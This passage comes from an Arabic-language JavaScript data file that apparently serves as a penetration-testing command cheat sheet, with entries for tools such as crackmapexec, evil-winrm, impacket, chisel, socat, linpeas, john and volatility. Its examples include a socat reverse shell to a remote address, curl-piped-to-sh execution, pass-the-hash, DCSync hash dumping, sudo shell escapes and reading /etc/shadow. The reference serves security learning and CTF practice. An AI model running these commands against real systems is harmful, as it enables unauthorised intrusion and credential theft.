    cat: 'network',
    level: 'intermediate',
    syntax: 'rpcclient -U <user> <host>',
    short: 'استغلال RPC على أنظمة Windows',
    desc: 'أداة لإجراء استفسارات RPC على أجهزة Windows لاستخراج معلومات الحسابات والمجموعات.',
    options: [
      { flag: '-U <user>', desc: 'اسم المستخدم' },
      { flag: '-N', desc: 'بدون كلمة مرور' },
      { flag: '-c <cmd>', desc: 'تنفيذ أمر RPC مباشرة' }
    ],
    examples: [
      { cmd: 'rpcclient -U "" -N 192.168.1.100', desc: 'اتصال NULL session' },
      { cmd: 'rpcclient -U "admin" 192.168.1.100', desc: 'اتصال مع مصادقة' }
    ],
    tips: 'استخدم enumdomusers و enumdomgroups بعد الاتصال.',
    related: ['smbclient', 'enum4linux', 'crackmapexec']
  },
  {
    id: 1383,
    name: 'crackmapexec',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'crackmapexec <protocol> <target> [options]',
    short: 'أداة post-exploitation متعددة البروتوكولات',
    desc: 'أداة Swiss Army knife لـ Active Directory تدعم SMB, WinRM, LDAP, SSH وتُستخدم للحركة الجانبية.',
    options: [
      { flag: 'smb', desc: 'استخدام بروتوكول SMB' },
      { flag: 'winrm', desc: 'استخدام WinRM' },
      { flag: '-u <user>', desc: 'اسم المستخدم أو قائمة' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '--shares', desc: 'تعداد المشاركات' },
      { flag: '-x <cmd>', desc: 'تنفيذ أمر' }
    ],
    examples: [
      { cmd: 'crackmapexec smb 192.168.1.0/24', desc: 'اكتشاف SMB على الشبكة' },
      { cmd: 'crackmapexec smb 192.168.1.100 -u admin -p password --shares', desc: 'تعداد المشاركات' },
      { cmd: 'crackmapexec smb 192.168.1.100 -u admin -p password -x "whoami"', desc: 'تنفيذ أمر عن بعد' }
    ],
    tips: 'crackmapexec يدعم Pass-the-Hash بدلاً من كلمة المرور.',
    related: ['impacket', 'metasploit', 'evil-winrm']
  },
  {
    id: 1384,
    name: 'evil-winrm',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'evil-winrm -i <host> -u <user> -p <pass>',
    short: 'Shell تفاعلية عبر WinRM لـ Windows',
    desc: 'أداة متخصصة للوصول إلى أجهزة Windows عبر WinRM (Windows Remote Management) مع ميزات متقدمة.',
    options: [
      { flag: '-i <host>', desc: 'عنوان IP الهدف' },
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '-H <hash>', desc: 'Pass-the-Hash بـ NTLM hash' },
      { flag: '-s <path>', desc: 'مسار سكريبت PowerShell' }
    ],
    examples: [
      { cmd: 'evil-winrm -i 192.168.1.100 -u Administrator -p "Password123"', desc: 'الاتصال بـ WinRM' },
      { cmd: 'evil-winrm -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee', desc: 'Pass-the-Hash' }
    ],
    tips: 'WinRM يعمل على المنفذ 5985 (HTTP) أو 5986 (HTTPS).',
    related: ['crackmapexec', 'psexec', 'metasploit']
  },
  {
    id: 1385,
    name: 'bloodhound',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'bloodhound',
    short: 'تحليل مسارات الهجوم في Active Directory',
    desc: 'أداة لتحليل العلاقات في Active Directory واكتشاف مسارات رفع الصلاحيات والحركة الجانبية.',
    options: [
      { flag: 'SharpHound', desc: 'أداة جمع البيانات لـ Windows' },
      { flag: '--CollectionMethod', desc: 'طريقة جمع البيانات' },
      { flag: 'All', desc: 'جمع كل البيانات' }
    ],
    examples: [
      { cmd: 'bloodhound-python -d domain.local -u user -p pass -ns 192.168.1.10 -c all', desc: 'جمع بيانات AD' },
      { cmd: 'bloodhound', desc: 'تشغيل واجهة BloodHound' }
    ],
    tips: 'ابحث عن "Shortest Path to Domain Admins" في BloodHound.',
    related: ['crackmapexec', 'powerview', 'ldapsearch']
  },
  {
    id: 1386,
    name: 'ldapsearch',
    cat: 'network',
    level: 'intermediate',
    syntax: 'ldapsearch -H <ldap://host> -D <dn> -w <pass> -b <base>',
    short: 'الاستعلام عن Active Directory عبر LDAP',
    desc: 'أداة سطر أوامر للاستعلام عن دلائل LDAP واستخراج معلومات المستخدمين والمجموعات.',
    options: [
      { flag: '-H <uri>', desc: 'رابط خادم LDAP' },
      { flag: '-D <dn>', desc: 'Distinguished Name للمصادقة' },
      { flag: '-w <pass>', desc: 'كلمة المرور' },
      { flag: '-b <base>', desc: 'نقطة البداية في الدليل' },
      { flag: '-x', desc: 'استخدام مصادقة بسيطة' }
    ],
    examples: [
      { cmd: 'ldapsearch -x -H ldap://192.168.1.100 -b "dc=domain,dc=local"', desc: 'استعلام LDAP بدون مصادقة' },
      { cmd: 'ldapsearch -H ldap://192.168.1.100 -D "cn=admin,dc=domain,dc=local" -w password -b "dc=domain,dc=local" "(objectClass=user)"', desc: 'استعلام المستخدمين' }
    ],
    tips: 'ابحث دائماً عن null bind لـ LDAP - قد يكشف معلومات بدون مصادقة.',
    related: ['bloodhound', 'enum4linux', 'crackmapexec']
  },
  {
    id: 1387,
    name: 'chisel',
    cat: 'pivoting',
    level: 'advanced',
    syntax: 'chisel server/client [options]',
    short: 'نفق TCP/UDP سريع عبر HTTP',
    desc: 'أداة Go لإنشاء أنفاق شبكية عبر HTTP مفيدة للتمحور وتجاوز جدران الحماية.',
    options: [
      { flag: 'server', desc: 'تشغيل وضع الخادم' },
      { flag: 'client', desc: 'تشغيل وضع العميل' },
      { flag: '--reverse', desc: 'تمكين reverse tunneling' },
      { flag: '-p <port>', desc: 'منفذ الاستماع' }
    ],
    examples: [
      { cmd: 'chisel server -p 8080 --reverse', desc: 'تشغيل الخادم مع reverse' },
      { cmd: 'chisel client 10.10.10.1:8080 R:socks', desc: 'إنشاء SOCKS proxy معكوس' }
    ],
    tips: 'chisel مفيد جداً في بيئات CTF للوصول للشبكات الداخلية.',
    related: ['ligolo', 'socat', 'proxychains']
  },
  {
    id: 1388,
    name: 'ligolo-ng',
    cat: 'pivoting',
    level: 'advanced',
    syntax: 'ligolo-ng [proxy/agent]',
    short: 'أداة tunneling متقدمة للتمحور',
    desc: 'أداة حديثة للتمحور تنشئ interface TUN افتراضية للوصول المباشر للشبكة الداخلية.',
    options: [
      { flag: 'proxy', desc: 'تشغيل Proxy (المهاجم)' },
      { flag: 'agent', desc: 'تشغيل Agent (الضحية)' },
      { flag: '--selfcert', desc: 'استخدام شهادة موقعة ذاتياً' }
    ],
    examples: [
      { cmd: './proxy -selfcert', desc: 'تشغيل Ligolo proxy' },
      { cmd: './agent -connect 10.10.10.1:11601 -ignore-cert', desc: 'اتصال Agent بالـ Proxy' }
    ],
    tips: 'ligolo-ng أفضل من chisel للتمحور في بيئات الاختبار الحقيقية.',
    related: ['chisel', 'socat', 'proxychains']
  },
  {
    id: 1389,
    name: 'proxychains',
    cat: 'pivoting',
    level: 'intermediate',
    syntax: 'proxychains <command>',
    short: 'توجيه الأوامر عبر SOCKS/HTTP proxy',
    desc: 'يتيح تشغيل أي برنامج عبر سلسلة من الـ proxies لإخفاء المصدر أو للوصول عبر الأنفاق.',
    options: [
      { flag: 'الإعداد في /etc/proxychains.conf', desc: 'إعداد الـ proxies' },
      { flag: 'socks5 127.0.0.1 1080', desc: 'استخدام SOCKS5 proxy' },
      { flag: 'dynamic_chain', desc: 'سلسلة ديناميكية (يتجاوز الفاشل)' }
    ],
    examples: [
      { cmd: 'proxychains nmap -sT 10.10.10.1', desc: 'nmap عبر proxy' },
      { cmd: 'proxychains curl http://internal-server.local', desc: 'curl عبر proxy' },
      { cmd: 'proxychains evil-winrm -i 172.16.1.10 -u admin -p pass', desc: 'WinRM عبر tunnel' }
    ],
    tips: 'لا تستخدم proxychains مع -sS في nmap - استخدم -sT فقط عبر SOCKS.',
    related: ['chisel', 'ligolo-ng', 'ssh']
  },
  {
    id: 1390,
    name: 'socat',
    cat: 'pivoting',
    level: 'intermediate',
    syntax: 'socat <addr1> <addr2>',
    short: 'relay شبكي متعدد الاستخدامات',
    desc: 'أداة قوية لإعادة توجيه الاتصالات بين منافذ وبروتوколات مختلفة، مفيدة للـ pivoting.',
    options: [
      { flag: 'TCP-LISTEN:<port>', desc: 'الاستماع على منفذ TCP' },
      { flag: 'TCP:<host>:<port>', desc: 'الاتصال بـ host:port' },
      { flag: 'EXEC:<cmd>', desc: 'تنفيذ أمر' },
      { flag: 'fork', desc: 'قبول اتصالات متعددة' }
    ],
    examples: [
      { cmd: 'socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80', desc: 'إعادة توجيه منفذ' },
      { cmd: 'socat TCP-LISTEN:4444,fork EXEC:/bin/bash', desc: 'bind shell' },
      { cmd: 'socat TCP:10.10.10.1:4444 EXEC:/bin/bash', desc: 'reverse shell' }
    ],
    tips: 'socat يمكن استخدامه كـ reverse shell أكثر استقراراً من nc.',
    related: ['netcat', 'proxychains', 'chisel']
  },
  {
    id: 1391,
    name: 'pwncat',
    cat: 'exploit',
    level: 'intermediate',
    syntax: 'pwncat-cs [options]',
    short: 'reverse/bind shell handler متقدم',
    desc: 'إطار post-exploitation متقدم للتعامل مع reverse shells مع ميزات مثل رفع الملفات وإدارة الجلسات.',
    options: [
      { flag: '-l', desc: 'وضع الاستماع' },
      { flag: '-p <port>', desc: 'منفذ الاستماع' },
      { flag: '-m linux', desc: 'استهداف Linux' }
    ],
    examples: [
      { cmd: 'pwncat-cs -l -p 4444', desc: 'الاستماع للاتصالات' },
      { cmd: 'pwncat-cs 10.10.10.1 4444', desc: 'الاتصال بـ listener' }
    ],
    tips: 'pwncat يتميز برفع ملفات تلقائياً وإكمال الأوامر.',
    related: ['netcat', 'socat', 'metasploit']
  },
  {
    id: 1392,
    name: 'impacket-secretsdump',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'secretsdump.py <user>:<pass>@<host>',
    short: 'استخراج كلمات مرور وهاشات من Windows',
    desc: 'جزء من مجموعة Impacket لاستخراج هاشات كلمات المرور من SAM, LSA, NTDS.dit عن بُعد.',
    options: [
      { flag: '-just-dc', desc: 'استخراج NTDS.dit فقط' },
      { flag: '-hashes <hash>', desc: 'استخدام NTLM hash' },
      { flag: '-outputfile <file>', desc: 'حفظ النتائج' }
    ],
    examples: [
      { cmd: 'secretsdump.py administrator:password@192.168.1.100', desc: 'استخراج الهاشات' },
      { cmd: 'secretsdump.py -just-dc domain/admin:pass@dc.domain.local', desc: 'استخراج من NTDS.dit' }
    ],
    tips: 'secretsdump عبر -just-dc يستخدم DCSync attack على Domain Controller.',
    related: ['crackmapexec', 'mimikatz', 'hashcat']
  },
  {
    id: 1393,
    name: 'impacket-psexec',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'psexec.py <user>:<pass>@<host>',
    short: 'تنفيذ أوامر عن بُعد على Windows عبر SMB',
    desc: 'تنفيذ أوامر عن بُعد على أجهزة Windows بصلاحيات SYSTEM عبر بروتوكول SMB.',
    options: [
      { flag: '-hashes <hash>', desc: 'Pass-the-Hash' },
      { flag: '-port <port>', desc: 'منفذ SMB' }
    ],
    examples: [
      { cmd: 'psexec.py administrator:password@192.168.1.100', desc: 'الحصول على shell SYSTEM' },
      { cmd: 'psexec.py -hashes aad3:ntlmhash domain/admin@192.168.1.100', desc: 'Pass-the-Hash' }
    ],
    tips: 'psexec يترك آثاراً في Event Log - استخدمه مع الانتباه.',
    related: ['crackmapexec', 'wmiexec', 'evil-winrm']
  },
  {
    id: 1394,
    name: 'impacket-wmiexec',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'wmiexec.py <user>:<pass>@<host>',
    short: 'تنفيذ أوامر عبر WMI على Windows',
    desc: 'تنفيذ أوامر على Windows عبر WMI مع تركه آثار أقل من psexec.',
    options: [
      { flag: '-hashes <hash>', desc: 'Pass-the-Hash' },
      { flag: '-nooutput', desc: 'بدون قراءة المخرجات' }
    ],
    examples: [
      { cmd: 'wmiexec.py administrator:password@192.168.1.100', desc: 'Shell عبر WMI' },
      { cmd: 'wmiexec.py -hashes :ntlmhash admin@192.168.1.100 "whoami"', desc: 'تنفيذ أمر واحد' }
    ],
    tips: 'wmiexec يتيح الوصول وصلاحيات المستخدم وليس SYSTEM مثل psexec.',
    related: ['psexec', 'crackmapexec', 'smbexec']
  },
  {
    id: 1395,
    name: 'linpeas',
    cat: 'privesc',
    level: 'intermediate',
    syntax: 'linpeas.sh [options]',
    short: 'رفع الصلاحيات التلقائي على Linux',
    desc: 'سكريبت شامل للبحث التلقائي عن مسارات رفع الصلاحيات على أنظمة Linux/Unix.',
    options: [
      { flag: '-a', desc: 'فحص شامل (أبطأ)' },
      { flag: '-q', desc: 'وضع الهدوء' },
      { flag: '-e', desc: 'فحص إضافي للثغرات' }
    ],
    examples: [
      { cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', desc: 'تحميل وتشغيل مباشر' },
      { cmd: './linpeas.sh | tee linpeas_output.txt', desc: 'تشغيل وحفظ النتائج' }
    ],
    tips: 'ركز على النتائج المظللة بالأحمر والأصفر في LinPEAS.',
    related: ['winpeas', 'lse', 'sudo-l']
  },
  {
    id: 1396,
    name: 'winpeas',
    cat: 'privesc',
    level: 'intermediate',
    syntax: 'winpeas.exe [options]',
    short: 'رفع الصلاحيات التلقائي على Windows',
    desc: 'سكريبت شامل للبحث عن مسارات رفع الصلاحيات على أنظمة Windows.',
    options: [
      { flag: 'all', desc: 'فحص كل الفئات' },
      { flag: 'quiet', desc: 'وضع الهدوء' },
      { flag: 'log', desc: 'حفظ النتائج في ملف' }
    ],
    examples: [
      { cmd: 'winpeas.exe', desc: 'فحص شامل' },
      { cmd: 'winpeas.exe quiet log', desc: 'فحص مع حفظ النتائج' }
    ],
    tips: 'WinPEAS يبحث عن Unquoted Service Paths و AlwaysInstallElevated وغيرها.',
    related: ['linpeas', 'powerview', 'seatbelt']
  },
  {
    id: 1397,
    name: 'pspy',
    cat: 'privesc',
    level: 'intermediate',
    syntax: 'pspy [options]',
    short: 'مراقبة العمليات على Linux بدون صلاحيات root',
    desc: 'يراقب العمليات الجديدة والمهام المجدولة على Linux دون الحاجة لصلاحيات root.',
    options: [
      { flag: '-f', desc: 'مراقبة عمليات الملفات' },
      { flag: '-i <ms>', desc: 'فترة الفحص بالميلي ثانية' },
      { flag: '-l <size>', desc: 'حجم المخزن' }
    ],
    examples: [
      { cmd: './pspy64', desc: 'مراقبة العمليات (64-bit)' },
      { cmd: './pspy32 -i 100', desc: 'مراقبة سريعة كل 100ms' }
    ],
    tips: 'pspy ممتاز لاكتشاف cron jobs التي تعمل بصلاحيات عالية.',
    related: ['linpeas', 'crontab', 'ps']
  },
  {
    id: 1398,
    name: 'gtfobins',
    cat: 'privesc',
    level: 'intermediate',
    syntax: 'استخدام SUDO أو SUID للـ binaries',
    short: 'استغلال Unix binaries لرفع الصلاحيات',
    desc: 'GTFOBins هو مرجع للـ Unix binaries التي يمكن استغلالها لرفع الصلاحيات عند تشغيلها بـ sudo أو SUID.',
    options: [
      { flag: 'sudo -l', desc: 'معرفة binaries المسموح بتشغيلها بـ sudo' },
      { flag: 'find / -perm -4000', desc: 'إيجاد ملفات SUID' }
    ],
    examples: [
      { cmd: 'sudo find . -exec /bin/sh \\; -quit', desc: 'رفع الصلاحيات عبر find' },
      { cmd: 'sudo vim -c \'!sh\'', desc: 'رفع الصلاحيات عبر vim' },
      { cmd: 'sudo awk \'BEGIN {system("/bin/sh")}\'', desc: 'رفع الصلاحيات عبر awk' }
    ],
    tips: 'تحقق دائماً من https://gtfobins.github.io للطرق المحدثة.',
    related: ['linpeas', 'sudo', 'suid']
  },
  {
    id: 1399,
    name: 'lse',
    cat: 'privesc',
    level: 'intermediate',
    syntax: 'lse.sh [options]',
    short: 'Linux Smart Enumeration لرفع الصلاحيات',
    desc: 'سكريبت ذكي لاستطلاع Linux يركز على إيجاد مسارات رفع الصلاحيات بشكل منظم.',
    options: [
      { flag: '-l <0-2>', desc: 'مستوى التفاصيل (0=مفيد فقط)' },
      { flag: '-i', desc: 'تفاعلي - اطرح أسئلة' },
      { flag: '-e', desc: 'فحص الثغرات' }
    ],
    examples: [
      { cmd: './lse.sh', desc: 'فحص بمستوى افتراضي' },
      { cmd: './lse.sh -l 2 -i', desc: 'فحص مفصل تفاعلي' }
    ],
    tips: 'lse أكثر تنظيماً وتركيزاً من linpeas لكنه أقل شمولاً.',
    related: ['linpeas', 'pspy', 'sudo-l']
  },
  {
    id: 1400,
    name: 'john',
    cat: 'password',
    level: 'beginner',
    syntax: 'john [options] <hashfile>',
    short: 'كسر كلمات مرور متعدد الصيغ',
    desc: 'John the Ripper أداة كلاسيكية لكسر كلمات المرور تدعم صيغ هاش متعددة مع قواميس وهجمات القوة.',
    options: [
      { flag: '--wordlist=<file>', desc: 'استخدام قاموس كلمات' },
      { flag: '--format=<format>', desc: 'تحديد صيغة الهاش' },
      { flag: '--rules', desc: 'تطبيق قواعد تحويل الكلمات' },
      { flag: '--show', desc: 'عرض الهاشات المكسورة' },
      { flag: '--incremental', desc: 'وضع القوة الكاملة' }
    ],
    examples: [
      { cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', desc: 'كسر بالقاموس' },
      { cmd: 'john --format=md5 --wordlist=rockyou.txt hashes.txt', desc: 'كسر هاش MD5' },
      { cmd: 'john --show hashes.txt', desc: 'عرض الهاشات المكسورة' }
    ],
    tips: 'استخدم john --list=formats لرؤية كل الصيغ المدعومة.',
    related: ['hashcat', 'hydra', 'unshadow']
  },
  {
    id: 1401,
    name: 'unshadow',
    cat: 'password',
    level: 'beginner',
    syntax: 'unshadow /etc/passwd /etc/shadow',
    short: 'دمج passwd و shadow لكسر كلمات المرور',
    desc: 'يدمج ملفي /etc/passwd و /etc/shadow لإنتاج ملف قابل للمعالجة بـ John the Ripper.',
    options: [],
    examples: [
      { cmd: 'unshadow /etc/passwd /etc/shadow > combined.txt', desc: 'دمج الملفين' },
      { cmd: 'john --wordlist=rockyou.txt combined.txt', desc: 'كسر الهاشات' }
    ],
    tips: 'تحتاج لصلاحيات root لقراءة /etc/shadow.',
    related: ['john', 'hashcat', 'passwd']
  },
  {
    id: 1402,
    name: 'fcrackzip',
    cat: 'password',
    level: 'beginner',
    syntax: 'fcrackzip [options] <zipfile>',
    short: 'كسر كلمات مرور ملفات ZIP',
    desc: 'أداة لكسر كلمات مرور ملفات ZIP بالقاموس أو بالقوة الكاملة.',
    options: [
      { flag: '-u', desc: 'استخدام unzip للتحقق' },
      { flag: '-D -p <wordlist>', desc: 'هجوم القاموس' },
      { flag: '-b', desc: 'هجوم القوة الكاملة' },
      { flag: '-c <charset>', desc: 'مجموعة الحروف' }
    ],
    examples: [
      { cmd: 'fcrackzip -u -D -p rockyou.txt file.zip', desc: 'كسر بالقاموس' },
      { cmd: 'fcrackzip -u -b -c "aA1!" file.zip', desc: 'هجوم قوة كاملة' }
    ],
    tips: 'بدائل: zip2john لاستخراج الهاش ثم john لكسره.',
    related: ['john', 'hashcat', 'zip2john']
  },
  {
    id: 1403,
    name: 'stegcracker',
    cat: 'steganography',
    level: 'intermediate',
    syntax: 'stegcracker <file> [wordlist]',
    short: 'كسر كلمات مرور ستيغانوغرافيا steghide',
    desc: 'أداة لكسر كلمات مرور الملفات المخفية باستخدام steghide بهجوم القاموس.',
    options: [],
    examples: [
      { cmd: 'stegcracker image.jpg', desc: 'كسر بالقاموس الافتراضي' },
      { cmd: 'stegcracker image.jpg wordlist.txt', desc: 'كسر بقاموس مخصص' }
    ],
    tips: 'في CTF، تحقق دائماً من الصور بـ steghide وstegcracker.',
    related: ['steghide', 'binwalk', 'exiftool']
  },
  {
    id: 1404,
    name: 'steghide',
    cat: 'steganography',
    level: 'beginner',
    syntax: 'steghide <embed|extract> [options]',
    short: 'إخفاء واستخراج البيانات في الصور',
    desc: 'أداة لإخفاء الملفات داخل صور JPEG وBMP وملفات صوتية WAV وAU.',
    options: [
      { flag: 'embed', desc: 'إخفاء ملف' },
      { flag: 'extract', desc: 'استخراج ملف مخفي' },
      { flag: '-cf <cover>', desc: 'ملف الغلاف' },
      { flag: '-ef <embed>', desc: 'الملف المراد إخفاؤه' },
      { flag: '-p <pass>', desc: 'كلمة المرور' }
    ],
    examples: [
      { cmd: 'steghide embed -cf image.jpg -ef secret.txt -p password', desc: 'إخفاء ملف نصي' },
      { cmd: 'steghide extract -sf image.jpg -p password', desc: 'استخراج الملف' },
      { cmd: 'steghide info image.jpg', desc: 'معلومات الإخفاء' }
    ],
    tips: 'جرب steghide extract بكلمة مرور فارغة في CTF.',
    related: ['stegcracker', 'binwalk', 'exiftool']
  },
  {
    id: 1405,
    name: 'stegsolve',
    cat: 'steganography',
    level: 'intermediate',
    syntax: 'java -jar stegsolve.jar',
    short: 'تحليل الصور بصرياً للكشف عن الإخفاء',
    desc: 'أداة Java لتحليل الصور وكشف البيانات المخفية عبر فلاتر مختلفة وطبقات الألوان.',
    options: [],
    examples: [
      { cmd: 'java -jar stegsolve.jar', desc: 'فتح واجهة stegsolve' }
    ],
    tips: 'استخدم File Format وزر التنقل بين planes للكشف عن البيانات.',
    related: ['steghide', 'binwalk', 'zsteg']
  },
  {
    id: 1406,
    name: 'zsteg',
    cat: 'steganography',
    level: 'intermediate',
    syntax: 'zsteg [options] <file>',
    short: 'كشف البيانات المخفية في صور PNG وBMP',
    desc: 'أداة Ruby لاكتشاف البيانات المخفية في صور PNG وBMP باستخدام تقنيات LSB وغيرها.',
    options: [
      { flag: '-a', desc: 'تجربة كل الطرق' },
      { flag: '-v', desc: 'وضع verbose' }
    ],
    examples: [
      { cmd: 'zsteg image.png', desc: 'فحص أساسي للصورة' },
      { cmd: 'zsteg -a image.png', desc: 'فحص شامل بكل الطرق' }
    ],
    tips: 'zsteg يتميز باكتشاف LSB (Least Significant Bit) steganography.',
    related: ['steghide', 'stegsolve', 'binwalk']
  },
  {
    id: 1407,
    name: 'exiftool',
    cat: 'forensics',
    level: 'beginner',
    syntax: 'exiftool [options] <file>',
    short: 'قراءة وتعديل بيانات EXIF للملفات',
    desc: 'أداة قوية لقراءة وكتابة وتعديل البيانات الوصفية (metadata) في أنواع ملفات متعددة.',
    options: [
      { flag: '-all=', desc: 'حذف كل البيانات الوصفية' },
      { flag: '-tag=<value>', desc: 'تعديل قيمة وسم محدد' },
      { flag: '-r', desc: 'المعالجة التكرارية للمجلدات' }
    ],
    examples: [
      { cmd: 'exiftool image.jpg', desc: 'عرض كل البيانات الوصفية' },
      { cmd: 'exiftool -all= image.jpg', desc: 'حذف كل البيانات الوصفية' },
      { cmd: 'exiftool -r /path/to/photos/', desc: 'فحص مجلد كامل' }
    ],
    tips: 'بيانات EXIF قد تكشف موقع الصورة الجغرافي (GPS coordinates).',
    related: ['steghide', 'binwalk', 'file']
  },
  {
    id: 1408,
    name: 'foremost',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'foremost [options] -i <input>',
    short: 'استعادة الملفات المحذوفة من القرص',
    desc: 'أداة carving لاستعادة الملفات من صور الأقراص أو الأقراص مباشرة بناءً على توقيعات الملفات.',
    options: [
      { flag: '-i <file>', desc: 'ملف الإدخال (image)' },
      { flag: '-o <dir>', desc: 'مجلد الإخراج' },
      { flag: '-t <types>', desc: 'أنواع الملفات المطلوبة' },
      { flag: '-q', desc: 'وضع السرعة' }
    ],
    examples: [
      { cmd: 'foremost -i disk.img -o recovered/', desc: 'استعادة من image' },
      { cmd: 'foremost -t jpg,pdf -i disk.img -o recovered/', desc: 'استعادة أنواع محددة' }
    ],
    tips: 'foremost مفيد جداً في CTF لاستخراج ملفات من images.',
    related: ['binwalk', 'scalpel', 'dd']
  },
  {
    id: 1409,
    name: 'scalpel',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'scalpel [options] <device/image>',
    short: 'استعادة ملفات محددة من أقراص صلبة',
    desc: 'أداة file carving متقدمة مشابهة لـ foremost مع قاموس تواقيع قابل للتخصيص.',
    options: [
      { flag: '-o <dir>', desc: 'مجلد الإخراج' },
      { flag: '-c <config>', desc: 'ملف الإعداد المخصص' }
    ],
    examples: [
      { cmd: 'scalpel disk.img -o output/', desc: 'استعادة الملفات' }
    ],
    tips: 'عدّل /etc/scalpel/scalpel.conf لتفعيل أنواع الملفات التي تريد استعادتها.',
    related: ['foremost', 'binwalk', 'dd']
  },
  {
    id: 1410,
    name: 'volatility3',
    cat: 'forensics',
    level: 'advanced',
    syntax: 'vol [options] -f <memory.dump> <plugin>',
    short: 'تحليل صور الذاكرة الرامية',
    desc: 'إطار تحليل الذاكرة الأكثر شيوعاً، يستخرج المعلومات من memory dumps لأنظمة Windows وLinux.',
    options: [
      { flag: '-f <file>', desc: 'ملف dump الذاكرة' },
      { flag: 'windows.pslist', desc: 'قائمة العمليات' },
      { flag: 'windows.netscan', desc: 'اتصالات الشبكة' },
      { flag: 'windows.cmdline', desc: 'أوامر سطر الأوامر' },
      { flag: 'windows.hashdump', desc: 'استخراج الهاشات' }
    ],
    examples: [
      { cmd: 'vol -f memory.dmp windows.pslist', desc: 'عرض العمليات' },
      { cmd: 'vol -f memory.dmp windows.netscan', desc: 'عرض الاتصالات الشبكية' },
      { cmd: 'vol -f memory.dmp windows.hashdump', desc: 'استخراج هاشات كلمات المرور' }
    ],
    tips: 'ابدأ دائماً بـ windows.info لمعرفة إصدار نظام التشغيل.',
    related: ['foremost', 'memdump', 'strings']
  },
  {
    id: 1411,
    name: 'memdump',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'memdump -p <pid> -o <output>',
    short: 'تفريغ ذاكرة العمليات',
    desc: 'أداة لتفريغ محتوى ذاكرة عمليات بعينها لتحليلها لاحقاً.',
    options: [
      { flag: '-p <pid>', desc: 'معرف العملية' },
      { flag: '-o <file>', desc: 'ملف الإخراج' }
    ],
    examples: [
      { cmd: 'memdump -p 1234 -o process.dump', desc: 'تفريغ ذاكرة عملية' }
    ],
    tips: 'استخدم /proc/<pid>/mem على Linux مباشرة لتفريغ ذاكرة العمليات.',
    related: ['volatility3', 'strings', 'gdb']
  },
  {
    id: 1412,
    name: 'radare2',
    cat: 'reverse-engineering',
    level: 'advanced',
    syntax: 'r2 [options] <binary>',
    short: 'إطار هندسة عكسية متكامل',
    desc: 'إطار عمل مفتوح المصدر للهندسة العكسية وتحليل الملفات الثنائية، يدعم disassembly وdebugging وexploitation.',
    options: [
      { flag: '-d', desc: 'تشغيل مع debugger' },
      { flag: '-A', desc: 'تحليل تلقائي كامل (aaa)' },
      { flag: '-w', desc: 'وضع الكتابة' }
    ],
    examples: [
      { cmd: 'r2 -A binary', desc: 'تحليل ملف ثنائي' },
      { cmd: 'r2 -d binary', desc: 'تشغيل مع debugger' }
    ],
    tips: 'استخدم aaa للتحليل الكامل، ثم pdf@main لعرض دالة main.',
    related: ['ghidra', 'gdb', 'objdump']
  },
  {
    id: 1413,
    name: 'ghidra',
    cat: 'reverse-engineering',
    level: 'advanced',
    syntax: 'ghidraRun',
    short: 'أداة هندسة عكسية من NSA',
    desc: 'إطار هندسة عكسية قوي مطور من NSA يدعم عشرات المعماريات مع decompiler متقدم.',
    options: [],
    examples: [
      { cmd: 'ghidraRun', desc: 'تشغيل واجهة Ghidra' },
      { cmd: 'analyzeHeadless /path/to/project ProjectName -import binary', desc: 'تحليل بدون واجهة' }
    ],
    tips: 'Ghidra decompiler ينتج كود C قابل للقراءة من الملفات الثنائية.',
    related: ['radare2', 'ida-pro', 'objdump']
  },
  {
    id: 1414,
    name: 'objdump',
    cat: 'reverse-engineering',
    level: 'intermediate',
    syntax: 'objdump [options] <file>',
    short: 'تفكيك الملفات الثنائية (disassembly)',
    desc: 'أداة GNU لعرض معلومات الملفات الثنائية وتفكيكها إلى assembly.',
    options: [
      { flag: '-d', desc: 'disassembly للأقسام القابلة للتنفيذ' },
      { flag: '-D', desc: 'disassembly لكل الأقسام' },
      { flag: '-s', desc: 'عرض محتوى كل الأقسام' },
      { flag: '-x', desc: 'عرض معلومات الرؤوس' }
    ],
    examples: [
      { cmd: 'objdump -d binary', desc: 'تفكيك القسم القابل للتنفيذ' },
      { cmd: 'objdump -M intel -d binary', desc: 'تفكيك بصيغة Intel' }
    ],
    tips: 'استخدم -M intel لصيغة قراءة أكثر وضوحاً.',
    related: ['radare2', 'ghidra', 'gdb']
  },
  {
    id: 1415,
    name: 'ltrace',
    cat: 'reverse-engineering',
    level: 'intermediate',
    syntax: 'ltrace [options] <command>',
    short: 'تتبع استدعاءات مكتبات C الديناميكية',
    desc: 'يعترض ويعرض استدعاءات مكتبات C الديناميكية أثناء تنفيذ البرنامج.',
    options: [
      { flag: '-s <size>', desc: 'أقصى طول للنص المعروض' },
      { flag: '-p <pid>', desc: 'الارتباط بعملية جارية' }
    ],
    examples: [
      { cmd: 'ltrace ./binary', desc: 'تتبع استدعاءات المكتبات' },
      { cmd: 'ltrace -s 100 ./binary', desc: 'مع نص أطول' }
    ],
    tips: 'ltrace مفيد في CTF لرؤية مقارنات كلمات المرور في strcmp.',
    related: ['strace', 'gdb', 'radare2']
  },
  {
    id: 1416,
    name: 'strace',
    cat: 'reverse-engineering',
    level: 'intermediate',
    syntax: 'strace [options] <command>',
    short: 'تتبع استدعاءات نظام Linux',
    desc: 'يعترض ويعرض استدعاءات النظام (system calls) التي يجريها البرنامج.',
    options: [
      { flag: '-e <trace>', desc: 'تتبع نوع محدد من الاستدعاءات' },
      { flag: '-o <file>', desc: 'حفظ المخرجات في ملف' },
      { flag: '-f', desc: 'تتبع العمليات الابنة' }
    ],
    examples: [
      { cmd: 'strace ./binary', desc: 'تتبع كل system calls' },
      { cmd: 'strace -e open,read ./binary', desc: 'تتبع open وread فقط' }
    ],
